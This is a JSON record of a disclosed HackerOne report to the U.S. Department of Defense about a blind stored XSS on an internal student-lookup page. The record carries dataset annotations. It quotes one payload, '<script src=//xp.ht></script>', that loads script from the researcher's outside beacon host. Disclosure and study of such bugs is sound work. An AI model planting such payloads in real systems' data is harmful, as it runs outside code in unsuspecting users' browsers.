{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "Blind Stored XSS on the internal host - █████████████",
  "content": "\nDescription\nHello. I often use mine xp.ht host as a beacon for SSRF/XSS payloads, and today one was triggered from the https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&& endpoint (it was found in the Referer header)\nThis domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.\nPOC\n███████\nSadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.\nThe GET /?_=1594756841631 indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload somewhere in the student data containing <script src=//xp.ht></script> or similar).\nYou may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.\nImpact\nBlind Stored XSS on the internal host.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1723838700,
  "report_url": "https://hackerone.com/reports/923912",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Use xp.ht host as a beacon for SSRF/XSS payloads."
    ],
    [
      2,
      "Observe the pingback triggered from the internal host at the specified URL."
    ]
  ],
  "vuln_description": "Blind Stored XSS on an internal host where the payload was triggered from a student lookup functionality, likely due to malicious script injection in student data.",
  "reason": "The vulnerability involves identifying a blind XSS through indirect means (pingback observation) without direct access to the internal host or clear entry point. The tester had to infer the vulnerability's existence and potential impact based on external observations.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The Blind Stored XSS vulnerability involves an internal host triggering a payload from an external beacon, which is not directly related to authentication or authorization boundaries. The methodology described focuses on testing AuthN/AuthZ bypasses and IDORs by swapping user sessions and resource IDs within the same application, which does not apply to detecting XSS vulnerabilities.",
    "is_detectable": false
  }
}